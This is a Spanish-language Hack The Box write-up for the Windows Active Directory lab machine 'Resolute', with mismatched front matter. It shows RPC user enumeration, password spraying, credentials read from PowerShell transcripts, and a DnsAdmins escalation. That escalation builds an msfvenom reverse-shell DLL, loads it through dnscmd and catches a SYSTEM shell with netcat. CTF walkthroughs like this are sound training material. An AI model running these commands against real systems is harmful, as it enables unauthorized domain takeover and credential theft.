---
layout: single
title: Awkward - Hack The Box
excerpt: "Máquina Windiws AD muy sencilla"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-resolute/resolute1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - binary exploit  
---

# 10.10.10.169 - Resolute

![](/assets/images/htb-resolute/resolute1.png)

--------------------------
# Part 1: Enumeración

Puertos abiertos -> 53(dns),88(kerberos),135(rcp),139,389(ldap),445(smb),464,593(http),636,3269,3268(ldap),5985(winrm),9389.

Primero intentamos sacar el nombre del dominio:
```console
└─$ crackmapexec smb 10.10.10.169
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)

└─$ smbmap -H 10.10.10.169 -u "cucuxii"
# No nos dejan acceder sin creds
```

## Puerto 53:
```console
└─$ dig @10.10.10.169 megabank.local ns
# megabank.local resolute.megabank.local
└─$ dig @10.10.10.169 megabank.local mx 
# hostmaster.megabank.local
```
## Puerto 135 RPC:
```console
└─$ rpcclient -U "" -N 10.10.10.169 -c 'enumdomusers' | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" >> users
└─$ rpcclient -U "" -N 10.10.10.169 -c 'enumdomusers' -c 'enumdomgroups' # Domain Admins (0x200)
└─$ rpcclient -U "" -N 10.10.10.169 -c 'querygroupmem 0x200' # -> rid 0x1f4
└─$ rpcclient -U "" -N 10.10.10.169 -c 'queryuser 0x1f4' # -> Administrator
└─$ rpcclient -U "" -N 10.10.10.169 -c 'querydispinfo' 
# Account: marko	Name: Marko Novak # Cuenta creada. Contraseña Welcome123!
```

Vamos a ver si funciona esta contraseña...
```console
└─$ smbmap -H 10.10.10.169 -u marko -p 'Welcome123!' # Error de autenticación
└─$ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
└─$ smbmap -H 10.10.10.169 -u 'melanie' -p 'Welcome123!'
# Tiene acceso a NETLOGON, SYSVOL e $IPC pero dentro no encuentro nada interesante
└─$ crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

--------------------------
# Part 2: En el sistema: Carpetas ocultas en disco C

```console
└─$ evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```
Subo mi script pero no encuentra nada interesante. Mi usaurio tampoco tiene nada interesante.     
En C:Users existe la carpeta home de otro usaurio, "ryan", no me deja acceder.   
```console
*Evil-WinRM* PS C:\Users\ryan> net user ryan
Global Group memberships     *Domain Users         *Contractors
```
Pero no parece que este grupo sirva para mucho...    
Encontramos en C una carpeta inusual "PSTranscripts" con dentro:  
```console
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
Dentro del script encontramos la frase "cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!"  

--------------------------
# Part 3: Escalando privilegios: Grupo DnsAdmins  
```console
└─$ evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```
En el escritorio tiene una nota:  
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email para el equipo:

- Como se congela el sistema cuando se aplican cambiosm todos esos cambios se revertiran en un minuto (salvo los
que haga el administrador)

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups /fo list | findstr "Name"
MEGABANK\DnsAdmins
``` 
Este grupo es vulnerable. La manera de explotarlo se dice [aquí](https://lolbas-project.github.io/#)
Basicmanete si cargas una dll maliciosa, al resetear el servicio dns se aplica.  

```console
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=666 -f dll -o wtf.dll
└─$ impacket-smbserver carpeta $(pwd) -smb2support

*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.16\carpeta\wtf.dll
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

└─$ rlwrap nc -lnvp 666
C:\Windows\system32> whoami
nt authority\system
```